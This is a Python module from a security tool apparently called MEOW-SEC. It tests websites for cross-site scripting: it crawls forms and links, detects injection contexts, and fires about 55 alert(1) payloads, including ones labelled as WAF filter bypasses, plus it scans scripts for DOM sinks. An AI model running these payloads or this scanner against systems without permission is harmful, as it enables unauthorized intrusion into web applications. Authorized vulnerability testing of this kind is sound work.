# -*- coding: utf-8 -*-
"""
MEOW-SEC :: XSSTESTER (#70) — Dedicated XSS Testing Module
50+ payloads by injection context, DOM XSS detection, form crawling
For authorized security testing and CTF challenges only.
"""
import re, json, os, time
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote

from core.ui import (console, ok, err, info, warn, find, show_module_banner,
                     ask_target, ask_choice, print_result_table, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk
from rich.rule import Rule
from rich.prompt import Prompt

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

# ─── PAYLOADS ────────────────────────────────────────────────

# HTML basic context (15 payloads)
PAYLOADS_HTML = [
    ("<script>alert(1)</script>",                          "Basic script tag"),
    ("<img src=x onerror=alert(1)>",                       "Img onerror"),
    ("<svg onload=alert(1)>",                              "SVG onload"),
    ("<iframe src=javascript:alert(1)>",                   "Iframe JS URI"),
    ("<body onload=alert(1)>",                             "Body onload"),
    ("<input autofocus onfocus=alert(1)>",                 "Input autofocus"),
    ("<details open ontoggle=alert(1)>",                   "Details ontoggle"),
    ("<video src=x onerror=alert(1)>",                     "Video onerror"),
    ("<marquee onstart=alert(1)>1</marquee>",              "Marquee onstart"),
    ("<object data=javascript:alert(1)>",                  "Object JS data"),
    ("<script>alert&#40;1&#41;</script>",                  "HTML entity encoded parens"),
    ("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "HTML entity encoded alert"),
    ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>","SVG animate onbegin"),
    ("<form><button formaction=javascript:alert(1)>X",     "Button formaction"),
    ("<script src=data:,alert(1)></script>",               "Data URI script src"),
]

# WAF bypass payloads (15 payloads)
PAYLOADS_WAF = [
    ("<scr<script>ipt>alert(1)</scr</script>ipt>",         "Nested tag bypass"),
    ("<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">", "Entity in attr"),
    ("<svg/onload=alert(1)>",                              "SVG no-space"),
    ("<IMG SRC=JaVaScRiPt:alert(1)>",                      "Mixed case JS URI"),
    ("<<SCRIPT>alert(1)//<</SCRIPT>",                      "Double open bracket"),
    ("<svg><script>alert&#40;1&#41;</script>",             "SVG script entity"),
    ("eval(atob('YWxlcnQoMSk='))",                        "Base64 eval"),
    ("setTimeout`alert\\x281\\x29`",                      "Template literal timeout"),
    ("<img src=1 href=1 onerror=\"javascript:alert(1)\">", "Multiple attrs"),
    ("<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>", "Unicode escape"),
    ("<svg onload=al&#101;rt(1)>",                         "Entity mid-word"),
    ("<a href=\"java&#9;script:alert(1)\">click</a>",      "Tab in JS URI"),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E",               "URL double-encoded"),
    ("<script>window['ale'+'rt'](1)</script>",             "String concat"),
    ("<img src=x onerror=top[/al/.source+/ert/.source](1)>", "Regex concat"),
]

# Attribute context payloads (10 payloads)
PAYLOADS_ATTR = [
    ("\" onmouseover=\"alert(1)",                          "DQ mouseover break"),
    ("' onmouseover='alert(1)",                            "SQ mouseover break"),
    ("\"><script>alert(1)</script>",                       "DQ script break"),
    ("'><script>alert(1)</script>",                        "SQ script break"),
    ("\" autofocus onfocus=\"alert(1)",                    "DQ onfocus break"),
    ("javascript:alert(1)",                                "JS URI as value"),
    ("data:text/html,<script>alert(1)</script>",           "Data URI HTML"),
    ("\" onblur=\"alert(1)\" tabindex=\"1",                "Onblur inject"),
    ("'><img src=x onerror=alert(1)>",                     "SQ img break"),
    ("&#x22;><svg onload=alert(1)>",                       "Hex entity break"),
]

# JavaScript string context payloads (10 payloads)
PAYLOADS_JS = [
    ("';alert(1)//",                                       "SQ string break"),
    ("\\';alert(1)//",                                     "Escaped SQ break"),
    ("</script><script>alert(1)",                          "Close script tag"),
    ("\\n}alert(1)\\n{",                                   "Newline block escape"),
    ("${alert(1)}",                                        "Template literal inject"),
    ("\";alert(1)//",                                      "DQ string break"),
    ("-alert(1)-",                                         "Minus operator"),
    ("/alert(1)//",                                        "Slash operator"),
    ("\\u0022;alert(1)//",                                 "Unicode DQ break"),
    ("\\x22;alert(1)//",                                   "Hex DQ break"),
]

# URL context payloads
PAYLOADS_URL = [
    ("javascript:alert(1)",                                "JS URI protocol"),
    ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "Data URI b64"),
    ("%22><script>alert(1)</script>",                      "URL encoded DQ"),
    ("javascript%3Aalert%281%29",                          "URL encoded JS URI"),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E",               "URL encoded tags"),
]

# DOM XSS dangerous sinks
DOM_SINKS = [
    "document.write(",
    "document.writeln(",
    ".innerHTML",
    ".outerHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "document.location",
    "window.location",
    "location.href",
    "location.replace(",
    "location.assign(",
    "document.domain",
    "document.URL",
    ".src",
    "$.html(",
    "$.append(",
]

# DOM XSS tainted sources
DOM_SOURCES = [
    "location.hash",
    "location.search",
    "location.href",
    "document.referrer",
    "window.name",
    "document.cookie",
    "localStorage",
    "sessionStorage",
    "document.URL",
    "document.documentURI",
]

# ─── HTTP HELPERS ────────────────────────────────────────────

def _get(url, params=None, timeout=10):
    if not HAS_REQUESTS:
        return None
    try:
        return requests.get(
            url, params=params, timeout=timeout,
            verify=False, allow_redirects=True, proxies=_px(),
            headers={"User-Agent": "MEOW-XSSTESTER/1.0 (authorized-test)"}
        )
    except Exception:
        return None

def _post(url, data=None, timeout=10):
    if not HAS_REQUESTS:
        return None
    try:
        return requests.post(
            url, data=data, timeout=timeout,
            verify=False, allow_redirects=True, proxies=_px(),
            headers={"User-Agent": "MEOW-XSSTESTER/1.0 (authorized-test)"}
        )
    except Exception:
        return None

def _inject_param(url: str, param: str, payload: str) -> str:
    """Rebuild URL with injected payload for a given GET param."""
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    new_q = urlencode(qs, doseq=True)
    return urlunparse(p._replace(query=new_q))

# ─── CONTEXT DETECTION ───────────────────────────────────────

MARKER = "MEOWXSS9999"

def detect_context(url: str, param: str) -> str:
    """
    Inject a marker and analyze where it appears in the response.
    Returns: 'html' | 'attr' | 'js' | 'url' | 'none'
    """
    test_url = _inject_param(url, param, MARKER)
    r = _get(test_url.split("?")[0], params=dict(parse_qs(urlparse(test_url).query)))
    if r is None:
        return "none"

    body = r.text

    if MARKER not in body:
        return "none"

    # Look for marker inside a JS string (var x = "MARKER" / var x = 'MARKER')
    if re.search(r'''(var|let|const)\s+\w+\s*=\s*["']''' + MARKER, body):
        return "js"
    if re.search(r'''["']''' + MARKER + r'''["']''', body):
        return "js"

    # Look for marker inside an HTML attribute value
    if re.search(r'''(value|href|src|action|data|placeholder)\s*=\s*["'][^"']*''' + MARKER, body, re.IGNORECASE):
        return "attr"
    # Generic attribute detection: any = "...MARKER..."
    if re.search(r'''=\s*["'][^"']*''' + MARKER, body):
        return "attr"

    # Look for marker as part of a URL in href/src
    if re.search(r'''(href|src|action)\s*=\s*["'][^"']*\?[^"']*''' + MARKER, body, re.IGNORECASE):
        return "url"

    # Default: reflected in HTML body
    return "html"

def _pick_payloads(context: str) -> list:
    """Return appropriate payload list based on context."""
    if context == "attr":
        return PAYLOADS_ATTR + PAYLOADS_WAF
    elif context == "js":
        return PAYLOADS_JS + PAYLOADS_WAF
    elif context == "url":
        return PAYLOADS_URL + PAYLOADS_ATTR + PAYLOADS_WAF
    else:
        # html or none — try full set
        return PAYLOADS_HTML + PAYLOADS_WAF

# ─── REFLECTION CHECK ────────────────────────────────────────

def _is_executable_xss(body: str, payload: str) -> bool:
    """Check if payload appears unencoded and contains executable XSS tags."""
    if payload not in body:
        return False
    executable_sigs = ["<script", "<img", "<svg", "<iframe", "<body", "<input",
                       "<details", "<video", "<object", "<form", "onerror=",
                       "onload=", "onfocus=", "ontoggle=", "javascript:"]
    for sig in executable_sigs:
        if sig in payload.lower() and sig in body.lower():
            return True
    return False

# ─── TEST A SINGLE PARAM (GET) ───────────────────────────────

def test_xss_get(base_url: str, param: str, context: str = None) -> list:
    """Test a single GET parameter for XSS across all relevant payloads."""
    vulns = []
    parsed = urlparse(base_url)
    params_base = {k: (v[0] if v else "") for k, v in parse_qs(parsed.query).items()}
    endpoint = base_url.split("?")[0]

    if context is None:
        context = detect_context(base_url, param)

    info(f"  Context detected: [{CY}]{context}[/] for [{G1}]{param}[/]")

    payloads = _pick_payloads(context)

    for payload, label in payloads:
        test_params = dict(params_base)
        test_params[param] = payload

        r = _get(endpoint, params=test_params)
        if r is None:
            continue

        body = r.text

        if _is_executable_xss(body, payload):
            vulns.append({
                "param": param,
                "method": "GET",
                "type": "Reflected XSS",
                "context": context,
                "payload": payload,
                "label": label,
                "evidence": "executable payload reflected unencoded",
            })
            find(f"[{RD}]REFLECTED XSS[/] [{CY}]{param}[/] [{DM}][{context}][/] → [{OR}]{label}[/]")
            break  # one confirmed per param is enough; remove break to test all
        elif payload in body:
            vulns.append({
                "param": param,
                "method": "GET",
                "type": "Reflected XSS (partial)",
                "context": context,
                "payload": payload,
                "label": label,
                "evidence": "payload reflected (check encoding)",
            })
            find(f"[{OR}]REFLECTED (partial)[/] [{CY}]{param}[/] → [{DM}]{label}[/]")

    return vulns

# ─── TEST A FORM (POST/GET) ───────────────────────────────────

def test_form_xss(base_url: str, form: dict) -> list:
    """Test a crawled form for XSS across all inputs."""
    vulns = []

    action = form.get("action", "") or base_url
    if not action.startswith("http"):
        action = urljoin(base_url, action)
    method = form.get("method", "GET").upper()
    inputs = form.get("inputs", [])

    if not inputs:
        return vulns

    # Build baseline data
    base_data = {inp["name"]: "test" for inp in inputs}

    for inp in inputs:
        if inp.get("type", "text") in ("submit", "button", "image", "reset", "hidden", "file"):
            continue
        param = inp["name"]

        for payload, label in (PAYLOADS_HTML + PAYLOADS_WAF):
            data = dict(base_data)
            data[param] = payload

            if method == "POST":
                r = _post(action, data=data)
            else:
                r = _get(action, params=data)

            if r is None:
                continue

            body = r.text

            if _is_executable_xss(body, payload):
                vuln_type = "Reflected XSS" if method == "GET" else "Stored XSS (candidate)"
                vulns.append({
                    "param": param,
                    "method": method,
                    "type": vuln_type,
                    "context": "form",
                    "payload": payload,
                    "label": label,
                    "evidence": f"executable payload in {method} form response",
                })
                find(f"[{RD}]{vuln_type}[/] [{CY}]{param}[/] [{DM}][form:{method}][/] → [{OR}]{label}[/]")
                break
            elif payload in body:
                vulns.append({
                    "param": param,
                    "method": method,
                    "type": "Reflected XSS (partial)",
                    "context": "form",
                    "payload": payload,
                    "label": label,
                    "evidence": "payload reflected in form response",
                })

    return vulns

# ─── FORM CRAWLER ────────────────────────────────────────────

def crawl_forms(url: str) -> list:
    """Extract all forms and GET-linked URLs with parameters from the page."""
    if not HAS_REQUESTS:
        return []
    try:
        from html.parser import HTMLParser

        class FormParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.forms = []
                self.links = []
                self._cur = None

            def handle_starttag(self, tag, attrs):
                a = dict(attrs)
                if tag == "form":
                    self._cur = {
                        "action": a.get("action", ""),
                        "method": a.get("method", "GET").upper(),
                        "inputs": [],
                    }
                    self.forms.append(self._cur)
                elif tag in ("input", "textarea", "select") and self._cur:
                    name = a.get("name", "")
                    if name:
                        self._cur["inputs"].append({
                            "name": name,
                            "type": a.get("type", "text"),
                        })
                elif tag == "a":
                    href = a.get("href", "")
                    if href and "?" in href:
                        self.links.append(href)

            def handle_endtag(self, tag):
                if tag == "form":
                    self._cur = None

        r = requests.get(url, timeout=10, verify=False, proxies=_px(),
                         headers={"User-Agent": "MEOW-XSSTESTER/1.0"})
        parser = FormParser()
        parser.feed(r.text)
        return {"forms": parser.forms, "links": parser.links}
    except Exception as e:
        warn(f"Crawl error: {e}")
        return {"forms": [], "links": []}

# ─── DOM XSS ANALYZER ────────────────────────────────────────

def analyze_dom_xss(url: str) -> list:
    """
    Fetch the page and all inline/external scripts, then search
    for dangerous sinks that appear near tainted sources.
    """
    findings = []

    if not HAS_REQUESTS:
        err("requests not available"); return findings

    # Fetch main page
    r = _get(url)
    if r is None:
        err("Could not fetch page for DOM analysis."); return findings

    scripts_content = [r.text]  # inline content

    # Extract and fetch external scripts
    script_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text, re.IGNORECASE)
    for src in script_urls[:10]:  # limit to 10 external scripts
        if not src.startswith("http"):
            src = urljoin(url, src)
        rs = _get(src)
        if rs:
            scripts_content.append(rs.text)

    for i, content in enumerate(scripts_content):
        lines = content.splitlines()
        for lineno, line in enumerate(lines, 1):
            line_lower = line.lower()

            # Check if this line contains a sink
            for sink in DOM_SINKS:
                if sink.lower() in line_lower:
                    # Check if a source is nearby (within 5 lines)
                    window_start = max(0, lineno - 6)
                    window_end = min(len(lines), lineno + 4)
                    window = "\n".join(lines[window_start:window_end])

                    for source in DOM_SOURCES:
                        if source.lower() in window.lower():
                            snippet = line.strip()[:120]
                            label = "page" if i == 0 else f"ext-script-{i}"
                            findings.append({
                                "type": "DOM XSS sink",
                                "sink": sink,
                                "source": source,
                                "location": f"{label}:line {lineno}",
                                "snippet": snippet,
                            })
                            find(f"[{RD}]DOM XSS[/] [{CY}]{sink}[/] ← [{OR}]{source}[/] [{DM}]@ {label}:L{lineno}[/]")
                            break  # one source match per sink occurrence is enough

    # Dedup by (sink, source, location)
    seen = set()
    deduped = []
    for f in findings:
        key = (f["sink"], f["source"], f["location"])
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    return deduped

# ─── SAVE ────────────────────────────────────────────────────

def _save(target: str, vulns: list, dom_findings: list):
    out_dir = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(out_dir, exist_ok=True)
    host = urlparse(target).netloc.replace(".", "_").replace(":", "_")[:30] or "unknown"
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = os.path.join(out_dir, f"xsstester_{host}_{ts}.json")
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({
            "target": target,
            "timestamp": ts,
            "xss_vulns": vulns,
            "dom_findings": dom_findings,
        }, f, indent=2, ensure_ascii=False)
    ok(f"Results saved → [{CY}]{os.path.basename(fname)}[/]")

# ─── MAIN ────────────────────────────────────────────────────

def run(target: str = None):
    show_module_banner("xsstester")
    cat_talk(CAT_SCAN, "XSSTESTER online — 50+ payloads, context detection, DOM analysis...", OR)
    console.print()

    warn("Use only on systems you own or have written permission to test.")
    console.print()

    if not target:
        target = ask_target("Target URL (e.g. https://site.com/page?q=test)")
    if not target:
        err("No target provided."); return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    info(f"Target: [{CY}]{target}[/]")
    console.print()

    # Mode selection
    console.print(f"  [{G1}][1][/] Auto — crawl + test all params and forms")
    console.print(f"  [{G1}][2][/] Manual — specify URL + parameter")
    console.print(f"  [{G1}][3][/] DOM XSS only — static JS sink analysis")
    console.print()
    mode = ask_choice("Mode", "1")

    all_vulns = []
    dom_findings = []

    # ── MODE 3: DOM XSS only ──
    if mode == "3":
        console.print(Rule(f"[{G1}] DOM XSS ANALYSIS ", style=G2))
        dom_findings = analyze_dom_xss(target)
        if not dom_findings:
            info(f"[{DM}]No DOM XSS sinks with tainted sources detected.[/]")
        _save(target, all_vulns, dom_findings)
        return

    # ── MODE 2: Manual ──
    if mode == "2":
        param = Prompt.ask(f"  [{G1}]◈ Parameter name[/]", default="q")
        params_list = [param.strip()] if param.strip() else []
        if not params_list:
            err("No parameter specified."); return
        console.print(Rule(f"[{G1}] XSS :: {params_list[0]} ", style=G2))
        context = detect_context(target, params_list[0])
        vulns = test_xss_get(target, params_list[0], context=context)
        all_vulns.extend(vulns)
        if not vulns:
            info(f"[{DM}]No XSS detected for parameter [{params_list[0]}][/]")

    # ── MODE 1: Auto ──
    elif mode == "1":
        # Test GET params from URL
        parsed = urlparse(target)
        url_params = list(parse_qs(parsed.query).keys())

        if url_params:
            info(f"GET params in URL: {url_params}")
            console.print()
            for param in url_params:
                console.print(Rule(f"[{G1}] XSS GET :: {param} ", style=G2))
                context = detect_context(target, param)
                vulns = test_xss_get(target, param, context=context)
                all_vulns.extend(vulns)
                if not vulns:
                    info(f"  [{DM}]No XSS for [{param}][/]")
        else:
            info(f"[{DM}]No GET params in URL — running crawl.[/]")

        # Crawl forms and additional links
        console.print()
        info("Crawling page for forms and linked URLs...")
        crawl_result = crawl_forms(target)
        forms = crawl_result.get("forms", [])
        links = crawl_result.get("links", [])

        if forms:
            info(f"Found [{G1}]{len(forms)}[/] form(s).")
            for i, form in enumerate(forms, 1):
                action = form.get("action") or target
                if not action.startswith("http"):
                    action = urljoin(target, action)
                inputs_names = [x["name"] for x in form.get("inputs", [])]
                console.print(f"  [{CY}]Form {i}[/]  method=[{G1}]{form['method']}[/]  "
                               f"action=[{CY}]{action[:60]}[/]  "
                               f"inputs={inputs_names}")
                console.print(Rule(f"[{G1}] XSS FORM {i} :: {form['method']} {action[:40]} ", style=G2))
                vulns = test_form_xss(target, form)
                all_vulns.extend(vulns)
                if not vulns:
                    info(f"  [{DM}]No XSS in form {i}[/]")
        else:
            info(f"[{DM}]No forms found.[/]")

        # Test GET params from crawled links
        if links:
            info(f"Found [{G1}]{len(links)}[/] linked URL(s) with parameters — testing...")
            seen_combos = set()
            for link in links[:20]:  # cap at 20 links
                full_link = urljoin(target, link) if not link.startswith("http") else link
                link_params = list(parse_qs(urlparse(full_link).query).keys())
                for param in link_params:
                    key = (full_link.split("?")[0], param)
                    if key in seen_combos:
                        continue
                    seen_combos.add(key)
                    console.print(Rule(f"[{G1}] XSS LINK :: {param} @ {link[:40]} ", style=G2))
                    context = detect_context(full_link, param)
                    vulns = test_xss_get(full_link, param, context=context)
                    all_vulns.extend(vulns)
                    if not vulns:
                        info(f"  [{DM}]No XSS for [{param}][/]")

        # Also run DOM analysis in auto mode
        console.print()
        console.print(Rule(f"[{G1}] DOM XSS ANALYSIS ", style=G2))
        dom_findings = analyze_dom_xss(target)
        if not dom_findings:
            info(f"[{DM}]No DOM XSS sinks with tainted sources detected.[/]")

    console.print()

    # ── RESULTS ──
    total = len(all_vulns) + len(dom_findings)
    if total:
        cat_talk(CAT_FOUND, f"{total} finding(s) — {len(all_vulns)} XSS, {len(dom_findings)} DOM", G1)
        console.print()

        if all_vulns:
            rows = [
                (
                    v["param"],
                    v["method"],
                    v["type"],
                    v["context"],
                    v["payload"][:45],
                )
                for v in all_vulns
            ]
            print_result_table(
                f"XSSTESTER RESULTS :: {target}",
                ["PARAM", "METHOD", "TYPE", "CONTEXT", "PAYLOAD"],
                rows,
            )

        if dom_findings:
            console.print()
            dom_rows = [
                (
                    f["sink"],
                    f["source"],
                    f["location"],
                    f["snippet"][:50],
                )
                for f in dom_findings
            ]
            print_result_table(
                "DOM XSS FINDINGS",
                ["SINK", "SOURCE", "LOCATION", "SNIPPET"],
                dom_rows,
            )
    else:
        info("No XSS vulnerabilities detected.")

    _save(target, all_vulns, dom_findings)
